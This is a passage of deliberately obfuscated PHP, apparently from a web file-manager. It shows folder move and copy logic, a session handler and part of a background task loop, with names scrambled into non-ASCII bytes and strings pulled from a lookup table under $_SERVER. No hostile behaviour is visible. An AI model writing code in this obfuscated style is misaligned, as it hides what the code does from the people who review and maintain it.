$this->targetIsDelete); $¼­Å£½ = $this->field($Ê»Íö)->where($•óéŸİİ)->select(); if (!$¼­Å£½) { return; } $¼­Å£½ = array_to_keyvalue($¼­Å£½, $‹×Êß[402]); foreach ($¼­Å£½ as $åÇî¢œ®) { $ÕÀÎëğË = $åÇî¢œ®[$‹×Êß[432]]; $š›°Ì…‹ = $åÇî¢œ®[$‹×Êß[402]]; if (!isset($this->_childrenListCache[$š›°Ì…‹]) && $åÇî¢œ®[$‹×Êß[410]] == $‹×Êß[88]) { $this->_childrenListCache[$š›°Ì…‹] = array(); } if (!isset($this->_childrenListCache[$ÕÀÎëğË])) { $this->_childrenListCache[$ÕÀÎëğË] = array(); } $this->_childrenListCache[$ÕÀÎëğË][$š›°Ì…‹] = $åÇî¢œ®; $this->_childrenItemCache[$š›°Ì…‹] = $åÇî¢œ®; } } private function _childrenListAll($ıÅØµæ“, &$îõá¹›) { $Ù¢ƒêÄÛ =& $_SERVER[Ã¶¡¶„æ]; if (!isset($this->_childrenListCache[$ıÅØµæ“])) { return; } $ŞºƒëËÅ = $this->_childrenListCache[$ıÅØµæ“]; foreach ($ŞºƒëËÅ as $œßãĞâó => $è²™’¡İ) { $îõá¹›[$œßãĞâó] = $è²™’¡İ; if ($è²™’¡İ[$Ù¢ƒêÄÛ[410]] == $Ù¢ƒêÄÛ[88]) { $this->_childrenListAll($œßãĞâó, $îõá¹›); } } } private function sourceInfoCache($ó‚…¦û”) { if (isset($this->_childrenItemCache[$ó‚…¦û”])) { return $this->_childrenItemCache[$ó‚…¦û”]; } return $this->sourceInfo($ó‚…¦û”); } private function _childrenList($õæçÓ½) { if (isset($this->_childrenListCache[$õæçÓ½])) { return $this->_childrenListCache[$õæçÓ½]; } return $this->_childrenListSelect($õæçÓ½); } private function _childrenListSelect($ŸÎ›Äà) { $÷ù¾ó¡¹ =& $_SERVER[Ã¶¡¶„æ]; $˜ÕıöïŞ = array($÷ù¾ó¡¹[432] => $ŸÎ›Äà, $÷ù¾ó¡¹[431] => $this->targetIsDelete); $‹§ÏÏ¡× = $this->where($˜ÕıöïŞ)->select(); $‹§ÏÏ¡× = $‹§ÏÏ¡× ? $‹§ÏÏ¡× : array(); $‰¨ÙñÁø = array_to_keyvalue($‹§ÏÏ¡×, $÷ù¾ó¡¹[402]); $this->_childrenListCache[$ŸÎ›Äà] = $‰¨ÙñÁø; foreach ($‰¨ÙñÁø as $ŸÎ›Äà => $àŒÂø®ª) { $this->_childrenItemCache[$ŸÎ›Äà] = $àŒÂø®ª; } return $‰¨ÙñÁø; } private function fileNameExistCache($²ñ‡—Î, $¬•‰ ‚¼) { $çœ˜ß¦ò =& $_SERVER[Ã¶¡¶„æ]; $¬•‰ ‚¼ = strtolower($¬•‰ ‚¼); $á•©·øö = $this->_childrenList($²ñ‡—Î); foreach ($á•©·øö as $İ—„×ï) { if ($¬•‰ ‚¼ == strtolower($İ—„×ï[$çœ˜ß¦ò[32]])) { return $İ—„×ï[$çœ˜ß¦ò[402]]; } } return !1; } private function fileNameAutoCache($ÆÆğ¡ïï, $Š¼‡˜Û¿, $¼ûÛï¡‘, $ÓÛ±æı˜) { $ó„ãÛ«¶ =& $_SERVER[Ã¶¡¶„æ]; $îÂÈø¼° = $this->_childrenList($ÆÆğ¡ïï); $ï™­¦Í = array_to_keyvalue($îÂÈø¼°, $ó„ãÛ«¶[12], $ó„ãÛ«¶[32]); return $this->fileNameAutoGet($ï™­¦Í, $Š¼‡˜Û¿, $¼ûÛï¡‘, $ÓÛ±æı˜); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($ˆ·ƒÆ, $¾‚íû˜, $àè°Ü = REPEAT_REPLACE, $º ğš¨ = '') { $×±™·¢– =& $_SERVER[Ã¶¡¶„æ]; $İøÇáØ¾ = $this->sourceInfo($ˆ·ƒÆ); $¡Ç‹İïó = $this->sourceInfo($¾‚íû˜); if ($İøÇáØ¾[$×±™·¢–[432]] == $¡Ç‹İïó[$×±™·¢–[402]]) { if ($İøÇáØ¾[$×±™·¢–[431]] == $×±™·¢–[88]) { Model($×±™·¢–[429])->restore(array($ˆ·ƒÆ)); } if (!$º ğš¨ || $º ğš¨ == $İøÇáØ¾[$×±™·¢–[32]]) { return $ˆ·ƒÆ; } } $àòŠã”Š = $this->pathInfoMore($ˆ·ƒÆ); if ($this->isParentOf($ˆ·ƒÆ, $¾‚íû˜)) { return !1; } if (!$İøÇáØ¾ || !$¡Ç‹İïó || $¡Ç‹İïó[$×±™·¢–[410]] != $×±™·¢–[88]) { return !1; } Hook::trigger($×±™·¢–[596], $àòŠã”Š); $this->targetIsDelete = intval($İøÇáØ¾[$×±™·¢–[431]]); if ($İøÇáØ¾[$×±™·¢–[432]] == $¾‚íû˜ && $º ğš¨ != $İøÇáØ¾[$×±™·¢–[32]]) { $äÆÂêË• = $this->fileNameExist($¾‚íû˜, $º ğš¨); if ($äÆÂêË• && $İøÇáØ¾[$×±™·¢–[410]] == $×±™·¢–[197]) { $·şÀÙŠ = $this->sourceInfo($äÆÂêË•); $§Ü§Ä·ˆ = $this->fileHistory($·şÀÙŠ, $İøÇáØ¾[$×±™·¢–[468]], $İøÇáØ¾[$×±™·¢–[76]]); if (!$§Ü§Ä·ˆ) { Model($×±™·¢–[471])->remove($İøÇáØ¾[$×±™·¢–[468]]); } $this->removeNow($ˆ·ƒÆ, !1); $this->folderSizeReset($¾‚íû˜); Hook::trigger($×±™·¢–[597], $àòŠã”Š); return $äÆÂêË•; } } $ÅëÇ¥Ôí = $º ğš¨ ? $º ğš¨ : $İøÇáØ¾[$×±™·¢–[32]]; $this->lockMoveStart($ˆ·ƒÆ); $this->lockWriteStart($¾‚íû˜, $ÅëÇ¥Ôí); $´ÖÍ·‘À = array($×±™·¢–[566] => array(), $×±™·¢–[598] => !1); $this->clearShare($ˆ·ƒÆ, $¾‚íû˜); $œÓ€Òù = $this->fileNameExistCache($¾‚íû˜, $İøÇáØ¾[$×±™·¢–[32]]); $¢¶‡ùŞø = $this->_move($ˆ·ƒÆ, $¾‚íû˜, $àè°Ü, $´ÖÍ·‘À, $º ğš¨); $this->sourceCacheClear(); if ($İøÇáØ¾[$×±™·¢–[410]] == $×±™·¢–[88] && $œÓ€Òù) { $this->folderSizeResetChildren($¢¶‡ùŞø); } Model($×±™·¢–[199])->linkAdd($´ÖÍ·‘À[$×±™·¢–[566]]); if ($œÓ€Òù && $´ÖÍ·‘À[$×±™·¢–[598]]) { $this->removeNow($ˆ·ƒÆ, !1); } $this->lockMoveEnd($ˆ·ƒÆ); $this->lockWriteEnd($¾‚íû˜, $ÅëÇ¥Ôí); $this->folderSizeReset($İøÇáØ¾[$×±™·¢–[432]]); $this->folderSizeReset($¾‚íû˜); $”‘ƒ»¹à = array($İøÇáØ¾[$×±™·¢–[432]], $¾‚íû˜); if ($İøÇáØ¾[$×±™·¢–[410]] == $×±™·¢–[88]) { $”‘ƒ»¹à[] = $ˆ·ƒÆ; } $this->updateModifyTime($”‘ƒ»¹à); Model($×±™·¢–[570])->eventMove($ˆ·ƒÆ, $İøÇáØ¾[$×±™·¢–[432]], $¾‚íû˜); Hook::trigger($×±™·¢–[597], $àòŠã”Š); return $¢¶‡ùŞø; } private function _move($›ŞûÔÕ, $Ÿ‡à†ùº, $øÇ¢“Ïç, &$³ÈúúÆ, $‡µ– Ë = '') { $‹ò›©âİ =& $_SERVER[Ã¶¡¶„æ]; $ÈÆ’ŠÓ = $this->sourceInfo($›ŞûÔÕ); $¹»¨ş¾ß = $ÈÆ’ŠÓ[$‹ò›©âİ[410]] == $‹ò›©âİ[88]; $ÌâäıŒ = $‡µ– Ë ? $‡µ– Ë : $ÈÆ’ŠÓ[$‹ò›©âİ[32]]; $§ö¿¢ø¿ = $this->fileNameExistCache($Ÿ‡à†ùº, $ÌâäıŒ); $this->lockMoveStart($›ŞûÔÕ); $this->lockWriteStart($Ÿ‡à†ùº, $ÌâäıŒ); if (!$§ö¿¢ø¿) { return $this->_moveForce($›ŞûÔÕ, $Ÿ‡à†ùº, $ÌâäıŒ); } $û¤‡á™å = $§ö¿¢ø¿; $şğ”‚ì = !1; if ($¹»¨ş¾ß) { if ($øÇ¢“Ïç == REPEAT_RENAME_FOLDER) { $ÌâäıŒ = $this->fileNameAuto($Ÿ‡à†ùº, $ÌâäıŒ, $øÇ¢“Ïç, $¹»¨ş¾ß); $û¤‡á™å = $this->_moveForce($›ŞûÔÕ, $Ÿ‡à†ùº, $ÌâäıŒ); } else { if ($øÇ¢“Ïç == REPEAT_RENAME_FOLDER) { $øÇ¢“Ïç = REPEAT_RENAME; } $İ©Ú­ë‡ = $this->_childrenListSelect($›ŞûÔÕ); foreach ($İ©Ú­ë‡ as $•÷’Î¶’) { $this->_move($•÷’Î¶’[$‹ò›©âİ[402]], $§ö¿¢ø¿, $øÇ¢“Ïç, $³ÈúúÆ); } $şğ”‚ì = !0; } } else { if ($øÇ¢“Ïç == REPEAT_SKIP) { $şğ”‚ì = !0; } else { if ($øÇ¢“Ïç == REPEAT_RENAME || $øÇ¢“Ïç == REPEAT_RENAME_FOLDER) { $ÌâäıŒ = $this->fileNameAuto($Ÿ‡à†ùº, $ÌâäıŒ, $øÇ¢“Ïç, $¹»¨ş¾ß); $û¤‡á™å = $this->_moveForce($›ŞûÔÕ, $Ÿ‡à†ùº, $ÌâäıŒ); } else { if ($øÇ¢“Ïç == REPEAT_REPLACE) { $™îğ˜ØÈ = $this->sourceInfoCache($§ö¿¢ø¿); $‹ê©ó¤¢ = $this->fileHistory($™îğ˜ØÈ, $ÈÆ’ŠÓ[$‹ò›©âİ[468]], $ÈÆ’ŠÓ[$‹ò›©âİ[76]]); $şğ”‚ì = !0; if ($‹ê©ó¤¢) { $³ÈúúÆ[$‹ò›©âİ[566]][] = $ÈÆ’ŠÓ[$‹ò›©âİ[468]]; } } } } } if ($şğ”‚ì && !$³ÈúúÆ[$‹ò›©âİ[598]]) { $³ÈúúÆ[$‹ò›©âİ[598]] = !0; } return $û¤‡á™å; } private function _moveForce($ü·şı£Ã, $Ø§‹œÃ, $£¹à×Ù) { $Ñó‡ÃˆÌ =& $_SERVER[Ã¶¡¶„æ]; $¯ßµÁ¨„ = $this->sourceInfo($ü·şı£Ã); $´Ê˜½ˆ = $this->sourceInfo($Ø§‹œÃ); $Õ´Í©ç‘ = $¯ßµÁ¨„[$Ñó‡ÃˆÌ[410]] == $Ñó‡ÃˆÌ[88]; $ŒÈÖ¹ºÛ = array($Ñó‡ÃˆÌ[401] => $´Ê˜½ˆ[$Ñó‡ÃˆÌ[402]], $Ñó‡ÃˆÌ[590] => $´Ê˜½ˆ[$Ñó‡ÃˆÌ[521]] . $´Ê˜½ˆ[$Ñó‡ÃˆÌ[402]] . $Ñó‡ÃˆÌ[50], $Ñó‡ÃˆÌ[586] => $´Ê˜½ˆ[$Ñó‡ÃˆÌ[411]], $Ñó‡ÃˆÌ[587] => $´Ê˜½ˆ[$Ñó‡ÃˆÌ[505]], $Ñó‡ÃˆÌ[589] => USER_ID, $Ñó‡ÃˆÌ[420] => $£¹à×Ù); $ŞÄ»£ôà = $¯ßµÁ¨„[$Ñó‡ÃˆÌ[411]] == SourceModel::TYPE_GROUP && $´Ê˜½ˆ[$Ñó‡ÃˆÌ[411]] == SourceModel::TYPE_GROUP && $¯ßµÁ¨„[$Ñó‡ÃˆÌ[505]] == $´Ê˜½ˆ[$Ñó‡ÃˆÌ[505]]; if (!$ŞÄ»£ôà && $this->moveClearAuth) { Model($Ñó‡ÃˆÌ[502])->authClear($ü·şı£Ã); } $Í¬±ÉÏ² = $¯ßµÁ¨„[$Ñó‡ÃˆÌ[431]] == $Ñó‡ÃˆÌ[88] && $´Ê˜½ˆ[$Ñó‡ÃˆÌ[431]] != $Ñó‡ÃˆÌ[88]; if ($Í¬±ÉÏ²) { $ŒÈÖ¹ºÛ[$Ñó‡ÃˆÌ[430]] = 0; } if ($Õ´Í©ç‘) { $çø¹´‹¸ = array($Ñó‡ÃˆÌ[590] => array($Ñó‡ÃˆÌ[550], $¯ßµÁ¨„[$Ñó‡ÃˆÌ[521]] . $¯ßµÁ¨„[$Ñó‡ÃˆÌ[402]] . $Ñó‡ÃˆÌ[551])); $ÁÂ®”ª = $¯ßµÁ¨„[$Ñó‡ÃˆÌ[521]] . $¯ßµÁ¨„[$Ñó‡ÃˆÌ[402]] . $Ñó‡ÃˆÌ[50]; $ëóßª = $´Ê˜½ˆ[$Ñó‡ÃˆÌ[521]] . $´Ê˜½ˆ[$Ñó‡ÃˆÌ[402]] . $Ñó‡ÃˆÌ[50] . $¯ßµÁ¨„[$Ñó‡ÃˆÌ[402]] . $Ñó‡ÃˆÌ[50]; $ÛÕÇÖì¼ = array($Ñó‡ÃˆÌ[590] => array($Ñó‡ÃˆÌ[599], "\x72\145\160\x6c\x61\143\145\50\x70\141\162\x65\x6e\x74\114\145\166\145\x6c\x2c\x27{$ÁÂ®”ª}\47\54\x27{$ëóßª}\x27\51"), $Ñó‡ÃˆÌ[586] => $´Ê˜½ˆ[$Ñó‡ÃˆÌ[411]], $Ñó‡ÃˆÌ[587] => $´Ê˜½ˆ[$Ñó‡ÃˆÌ[505]]); if ($Í¬±ÉÏ²) { $ÛÕÇÖì¼[$Ñó‡ÃˆÌ[430]] = 0; } $this->where($çø¹´‹¸)->data($ÛÕÇÖì¼)->save(); } $this->where(array($Ñó‡ÃˆÌ[417] => $ü·şı£Ã))->data($ŒÈÖ¹ºÛ)->save(); return $ü·şı£Ã; } private function clearShare($î”»Ïşà, $è¿³©ßÄ) { $°æğéŠÔ =& $_SERVER[Ã¶¡¶„æ]; $Çƒ–¿ã¤ = $this->sourceInfo($î”»Ïşà); $ÇÅşˆà = $this->sourceInfo($è¿³©ßÄ); if ($Çƒ–¿ã¤[$°æğéŠÔ[505]] == $ÇÅşˆà[$°æğéŠÔ[505]] && $Çƒ–¿ã¤[$°æğéŠÔ[411]] == $°æğéŠÔ[600]) { return; } $º•–‚Ç = array($°æğéŠÔ[521] => array($°æğéŠÔ[550], $Çƒ–¿ã¤[$°æğéŠÔ[521]] . $î”»Ïşà . $°æğéŠÔ[551])); $÷Ã´‚Æ· = $this->field($°æğéŠÔ[417])->where($º•–‚Ç)->getField($°æğéŠÔ[402], !0); if (!$÷Ã´‚Æ·) { return; } $º•–‚Ç = array($°æğéŠÔ[402] => array($°æğéŠÔ[7], $÷Ã´‚Æ·), $°æğéŠÔ[496] => 1); $¥Åü©İ‚ = Model($°æğéŠÔ[601])->field($°æğéŠÔ[489])->where($º•–‚Ç)->select(); if (!$¥Åü©İ‚) { return; } $¥Åü©İ‚ = array_to_keyvalue($¥Åü©İ‚, $°æğéŠÔ[12], $°æğéŠÔ[489]); $º•–‚Ç = array($°æğéŠÔ[489] => array($°æğéŠÔ[7], $¥Åü©İ‚)); Model($°æğéŠÔ[601])->where($º•–‚Ç)->save(array($°æğéŠÔ[496] => 0)); Model($°æğéŠÔ[602])->where($º•–‚Ç)->delete(); } public function copyFolderFromIO($•Š¨ê¤, $ùÂğ‚òˆ, $î”ÜÒ·, $Ö™ğ½î³, $Âîû£‘È, $˜¹Ä“•Ô = false) { $Ä¯³çïå =& $_SERVER[Ã¶¡¶„æ]; $Íúúæ©Î = array($Ä¯³çïå[567] => array(), $Ä¯³çïå[568] => array(), $Ä¯³çïå[566] => array(), $Ä¯³çïå[603] => array()); $‘Ÿ¼Ûê¡ = $˜¹Ä“•Ô ? $˜¹Ä“•Ô : $•Š¨ê¤->pathThis($ùÂğ‚òˆ); $İØ­Î‡Û = $this->fileNameExist($î”ÜÒ·, $‘Ÿ¼Ûê¡); $şŒøğìì = $this->mkdir($î”ÜÒ·, $‘Ÿ¼Ûê¡, $Ö™ğ½î³); if (!$İØ­Î‡Û || $Ö™ğ½î³ == REPEAT_RENAME_FOLDER) { $Ö™ğ½î³ = !1; } if ($İØ­Î‡Û) { $this->_childrenAllMake($İØ­Î‡Û); } Hook::trigger($Ä¯³çïå[604]); $this->_copyChildTo($•Š¨ê¤, $ùÂğ‚òˆ, $şŒøğìì, $Ö™ğ½î³, $Íúúæ©Î, $Âîû£‘È); Hook::trigger($Ä¯³çïå[605]); if ($şŒøğìì) { $this->folderSizeResetChildren($şŒøğìì); } $this->_childrenListClear(); Model($Ä¯³çïå[569])->addAll($Íúúæ©Î[$Ä¯³çïå[567]], array(), !0); Model($Ä¯³çïå[570])->eventCopy($şŒøğìì); $this->saveAll($Íúúæ©Î[$Ä¯³çïå[568]]); Model($Ä¯³çïå[471])->linkAdd($Íúúæ©Î[$Ä¯³çïå[566]]); Model($Ä¯³çïå[471])->remove($Íúúæ©Î[$Ä¯³çïå[603]]); $this->folderSizeReset($î”ÜÒ·); $this->updateModifyTime($î”ÜÒ·); return $şŒøğìì; } private function _copyChildTo($êÊ›§Ç£, $ùº¹¿÷, $êáëŠ¿õ, $±—»Å‹, &$€‹âûš, $ŸÌ—°Ûı) { $ãĞšùı =& $_SERVER[Ã¶¡¶„æ]; $‚²ÕĞÑ£ = $this->sourceInfoCache($êáëŠ¿õ); $¡öö”‚Ì = $êÊ›§Ç£->listPath($ùº¹¿÷); $¡öö”‚Ì = $¡öö”‚Ì ? $¡öö”‚Ì : array($ãĞšùı[83] => array(), $ãĞšùı[82] => array()); $…«åÌÓ = array_merge($¡öö”‚Ì[$ãĞšùı[83]], $¡öö”‚Ì[$ãĞšùı[82]]); $ŒôÂñä÷ = $this->_addFiles($êÊ›§Ç£, $¡öö”‚Ì[$ãĞšùı[83]], $ŸÌ—°Ûı); $«¾îïƒ¥ = array(); foreach ($…«åÌÓ as &$Àà®ÁôŠ) { if (isset($ŒôÂñä÷[$Àà®ÁôŠ[$ãĞšùı[32]]])) { $Àà®ÁôŠ = $ŒôÂñä÷[$Àà®ÁôŠ[$ãĞšùı[32]]]; } $Àà®ÁôŠ[$ãĞšùı[410]] = $Àà®ÁôŠ[$ãĞšùı[33]] == $ãĞšùı[75]; $Àà®ÁôŠ[$ãĞšùı[412]] = substr(_get($Àà®ÁôŠ, $ãĞšùı[174], $ãĞšùı[12]), 0, 10); $Àà®ÁôŠ[$ãĞšùı[76]] = _get($Àà®ÁôŠ, $ãĞšùı[76], 0); $Àà®ÁôŠ[$ãĞšùı[468]] = _get($Àà®ÁôŠ, $ãĞšùı[468], 0); if (!isset($Àà®ÁôŠ[$ãĞšùı[606]]) && $Àà®ÁôŠ[$ãĞšùı[468]]) { $€‹âûš[$ãĞšùı[603]][] = $Àà®ÁôŠ[$ãĞšùı[468]]; } if ($±—»Å‹) { $ùòü§é„ = $this->fileNameExistCache($êáëŠ¿õ, $Àà®ÁôŠ[$ãĞšùı[32]]); if ($ùòü§é„) { if ($Àà®ÁôŠ[$ãĞšùı[410]] || $±—»Å‹ == REPEAT_SKIP) { continue; } if ($±—»Å‹ == REPEAT_REPLACE) { $·›ªÍøÄ = $this->sourceInfoCache($ùòü§é„); $Ş×–î’Ã = $this->fileHistory($·›ªÍøÄ, $Àà®ÁôŠ[$ãĞšùı[468]], $Àà®ÁôŠ[$ãĞšùı[76]]); if ($Ş×–î’Ã) { $€‹âûš[$ãĞšùı[566]][] = $Àà®ÁôŠ[$ãĞšùı[468]]; } continue; } else { if ($±—»Å‹ == REPEAT_RENAME) { $Àà®ÁôŠ[$ãĞšùı[32]] = $this->fileNameAutoCache($êáëŠ¿õ, $Àà®ÁôŠ[$ãĞšùı[32]], $±—»Å‹, !1); } } } } if (!$Àà®ÁôŠ[$ãĞšùı[410]] && $Àà®ÁôŠ[$ãĞšùı[468]] == 0) { continue; } if (!$Àà®ÁôŠ[$ãĞšùı[410]] && $Àà®ÁôŠ[$ãĞšùı[468]]) { $€‹âûš[$ãĞšùı[566]][] = $Àà®ÁôŠ[$ãĞšùı[468]]; } $«¾îïƒ¥[] = $this->_makeItemData($Àà®ÁôŠ, $‚²ÕĞÑ£, $Àà®ÁôŠ[$ãĞšùı[32]]); } unset($Àà®ÁôŠ); if (!empty($«¾îïƒ¥)) { $this->addAll($«¾îïƒ¥); $this->_childrenListSelect($êáëŠ¿õ); } $÷­š™®® = $this->_childrenList($êáëŠ¿õ); $÷­š™®® = array_to_keyvalue($÷­š™®®, $ãĞšùı[32]); foreach ($…«åÌÓ as $Àà®ÁôŠ) { $·›ªÍøÄ = $÷­š™®®[$Àà®ÁôŠ[$ãĞšùı[32]]]; $ÏÁ¡óí¸ = $·›ªÍøÄ[$ãĞšùı[402]]; $this->_copyApplyMeta($·›ªÍøÄ, $€‹âûš); if ($Àà®ÁôŠ[$ãĞšùı[33]] == $ãĞšùı[75]) { $Àà®ÁôŠ[$ãĞšùı[84]] = $êÊ›§Ç£->getPathInner($Àà®ÁôŠ[$ãĞšùı[84]]); $this->_copyChildTo($êÊ›§Ç£, $Àà®ÁôŠ[$ãĞšùı[84]], $ÏÁ¡óí¸, $±—»Å‹, $€‹âûš, $ŸÌ—°Ûı); } } } private function _addFiles($’‹¯Éš´, $Çô»‚öÌ, $©¯¤à¦) { $š¢¯±­ =& $_SERVER[Ã¶¡¶„æ]; if (!$Çô»‚öÌ || count($Çô»‚öÌ) == 0) { return array(); } $÷§Š¾æø = array(); foreach ($Çô»‚öÌ as &$É¤Ğµ´Ü) { Hook::trigger($š¢¯±­[607], $É¤Ğµ´Ü); $É¤Ğµ´Ü[$š¢¯±­[84]] = $’‹¯Éš´->getPathInner($É¤Ğµ´Ü[$š¢¯±­[84]]); $Å„ÌŸ£Ù = $’‹¯Éš´->hashSimple($É¤Ğµ´Ü[$š¢¯±­[84]]); $ğû‹øìÓ = $’‹¯Éš´->hashMd5($É¤Ğµ´Ü[$š¢¯±­[84]]); if (strlen($ğû‹øìÓ) > 10 && !isset($÷§Š¾æø[$ğû‹øìÓ])) { $÷§Š¾æø[$ğû‹øìÓ] = array(); } $É¤Ğµ´Ü[$š¢¯±­[177]] = $Å„ÌŸ£Ù; $É¤Ğµ´Ü[$š¢¯±­[176]] = $ğû‹øìÓ; $÷§Š¾æø[$ğû‹øìÓ][] =& $É¤Ğµ´Ü; if (count($÷§Š¾æø[$ğû‹øìÓ]) > 1) { $É¤Ğµ´Ü[$š¢¯±­[606]] = !0; } Hook::trigger($š¢¯±­[608], $É¤Ğµ´Ü); } unset($É¤Ğµ´Ü); $³Ş•Øïª = array($š¢¯±­[176] => array($š¢¯±­[7], array_keys($÷§Š¾æø))); $½ß­®ù = Model($š¢¯±­[609]); $Ğ™åÙöË = $½ß­®ù->where($³Ş•Øïª)->select(); $Ğ™åÙöË = $Ğ™åÙöË ? $Ğ™åÙöË : array(); foreach ($Ğ™åÙöË as $ğÄÏ•Ú) { if (!isset($÷§Š¾æø[$ğÄÏ•Ú[$š¢¯±­[176]]])) { continue; } $¯Ää­ô = $÷§Š¾æø[$ğÄÏ•Ú[$š¢¯±­[176]]]; foreach ($¯Ää­ô as &$É¤Ğµ´Ü) { $É¤Ğµ´Ü[$š¢¯±­[468]] = $ğÄÏ•Ú[$š¢¯±­[468]]; $É¤Ğµ´Ü[$š¢¯±­[606]] = !0; } unset($É¤Ğµ´Ü); } $ˆ¶¯Í¥° = array(); foreach ($Çô»‚öÌ as $çŒ²µÏ²) { Hook::trigger($š¢¯±­[610], $çŒ²µÏ²); if (isset($çŒ²µÏ²[$š¢¯±­[606]]) && $çŒ²µÏ²[$š¢¯±­[606]]) { Hook::trigger($š¢¯±­[611], $çŒ²µÏ²); continue; } $‰Èı‡Â± = $’‹¯Éš´->getPathInner($çŒ²µÏ²[$š¢¯±­[84]]); $¬àÒÓ± = $½ß­®ù->addFileMake($‰Èı‡Â±, $çŒ²µÏ²[$š¢¯±­[76]], $çŒ²µÏ²[$š¢¯±­[177]], $çŒ²µÏ²[$š¢¯±­[176]], $çŒ²µÏ²[$š¢¯±­[32]], $©¯¤à¦); Hook::trigger($š¢¯±­[611], $çŒ²µÏ²); if (!is_array($¬àÒÓ±)) { continue; } $ˆ¶¯Í¥°[] = $¬àÒÓ±; } $½ß­®ù->addAll($ˆ¶¯Í¥°); $³Ş•Øïª = array($š¢¯±­[176] => array($š¢¯±­[7], array_keys($÷§Š¾æø))); $Ğ™åÙöË = $½ß­®ù->where($³Ş•Øïª)->select(); $Ğ™åÙöË = $Ğ™åÙöË ? $Ğ™åÙöË : array(); foreach ($Ğ™åÙöË as $ğÄÏ•Ú) { if (!isset($÷§Š¾æø[$ğÄÏ•Ú[$š¢¯±­[176]]])) { continue; } $ƒÈÕˆÂº =& $÷§Š¾æø[$ğÄÏ•Ú[$š¢¯±­[176]]]; foreach ($ƒÈÕˆÂº as &$É¤Ğµ´Ü) { $É¤Ğµ´Ü[$š¢¯±­[468]] = $ğÄÏ•Ú[$š¢¯±­[468]]; } unset($É¤Ğµ´Ü); } $œãÙşÁ = array(); foreach ($Çô»‚öÌ as $àÅ¾ô£É) { $œãÙşÁ[$àÅ¾ô£É[$š¢¯±­[32]]] = $àÅ¾ô£É; } return $œãÙşÁ; } } goto fõ”µ´êƒ; AÄÑù¾à·Ğ: class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $¤õ¦€Èø =& $_SERVER[Ã¶¡¶„æ]; static $ĞÏ­ä† = false; if ($ĞÏ­ä†) { return $ĞÏ­ä†; } $ò”®ÍŞ” = $GLOBALS[$¤õ¦€Èø[6]][$¤õ¦€Èø[349]]; self::$sessionTime = $ò”®ÍŞ”[$¤õ¦€Èø[1631]]; $Î‘”‘¨¬ = isset($GLOBALS[$¤õ¦€Èø[1632]]) ? $GLOBALS[$¤õ¦€Èø[1632]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($Î‘”‘¨¬)) { self::$sessionSign = Cookie::get($Î‘”‘¨¬); } else { self::$sessionSign = guid(); } } Cookie::setSafe($Î‘”‘¨¬, self::$sessionSign, self::$sessionTime); $«â…å×Ì = $ò”®ÍŞ”[$¤õ¦€Èø[1633]]; $Ø‡§Šù‘ = $ò”®ÍŞ”[$«â…å×Ì]; $¯ƒ»Œğ« = $ò”®ÍŞ”[$¤õ¦€Èø[834]]; switch ($«â…å×Ì) { case $¤õ¦€Èø[21]: self::$handle = Model($¤õ¦€Èø[835]); break; case $¤õ¦€Èø[836]: self::$handle = new CacheRedis($Ø‡§Šù‘, $¯ƒ»Œğ«); break; case $¤õ¦€Èø[837]: self::$handle = new CacheMemcached($Ø‡§Šù‘, $¯ƒ»Œğ«); break; case $¤õ¦€Èø[199]: $Ø‡§Šù‘[$¤õ¦€Èø[84]] = $Ø‡§Šù‘[$¤õ¦€Èø[84]] . $¤õ¦€Èø[1634]; self::$handle = new CacheFile($Ø‡§Šù‘, $¯ƒ»Œğ«); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $ĞÏ­ä† = new self(); return $ĞÏ­ä†; } public static function getBySign($Æü¥¤¨É) { $Å×¡®‡¢ = self::$handle->get($Æü¥¤¨É); $Å×¡®‡¢ = unserialize($Å×¡®‡¢); return is_array($Å×¡®‡¢) ? $Å×¡®‡¢ : array(); } public static function setBySign($åã‡ûõ, $­şÂì³İ) { CacheLock::lock($åã‡ûõ); self::$handle->set($åã‡ûõ, serialize($­şÂì³İ), self::$sessionTime); CacheLock::unlock($åã‡ûõ); } public static function sign($™–¾•´ = false) { $™–¾•´ && (self::$sessionSign = $™–¾•´); self::init(); return self::$sessionSign; } public static function set($ğàş¥ø, $¾È‡Àê‚ = false) { self::init(); if (is_array($ğàş¥ø)) { foreach ($ğàş¥ø as $‰Ã…ş©Õ => $—×Åµš) { array_set_value(self::$data, $‰Ã…ş©Õ, $—×Åµš); } } else { array_set_value(self::$data, $ğàş¥ø, $¾È‡Àê‚); } self::setBySign(self::$sessionSign, self::$data); } public static function get($Ø¹ï¡Ê‡ = false) { self::init(); if (!$Ø¹ï¡Ê‡) { return self::$data; } return array_get_value(self::$data, $Ø¹ï¡Ê‡); } public static function remove($Ê¥®¯ÓÓ) { self::init(); unset(self::$data[$Ê¥®¯ÓÓ]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[Ã¶¡¶„æ][839])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $£ÔéÃÖ =& $_SERVER[Ã¶¡¶„æ]; if (self::valueGet($£ÔéÃÖ[756]) != $£ÔéÃÖ[88]) { return; } if (self::valueGet($£ÔéÃÖ[1635]) == $£ÔéÃÖ[88]) { $ˆ“–«ÇÊ = self::valueGet($£ÔéÃÖ[1636]); if (time() - $ˆ“–«ÇÊ > self::AUTO_RESTART_TIME) { self::restart(); } return; } http_close(); $GLOBALS[$£ÔéÃÖ[1637]] = 1; self::valueSet($£ÔéÃÖ[1635], $£ÔéÃÖ[88]); self::log($£ÔéÃÖ[1638] . ACTION . $£ÔéÃÖ[1639]); Session::$data = array(); Session::$sessionSign = $£ÔéÃÖ[12]; $GLOBALS[$£ÔéÃÖ[503]] = 1; Hook::bind($£ÔéÃÖ[1640], $£ÔéÃÖ[1641]); $Íœî¬ = 0; while (!0) { self::cacheClear(); if (self::valueGet($£ÔéÃÖ[756]) != $£ÔéÃÖ[88]) { self::valueSet($£ÔéÃÖ[1635], $£ÔéÃÖ[197]); self::log($£ÔéÃÖ[1642]); die; } $Ä¬ı‹¡Ï = time(); if ($Ä¬ı‹¡Ï - $Íœî¬ >= 60) { self::valueSet(array($£ÔéÃÖ[1635] 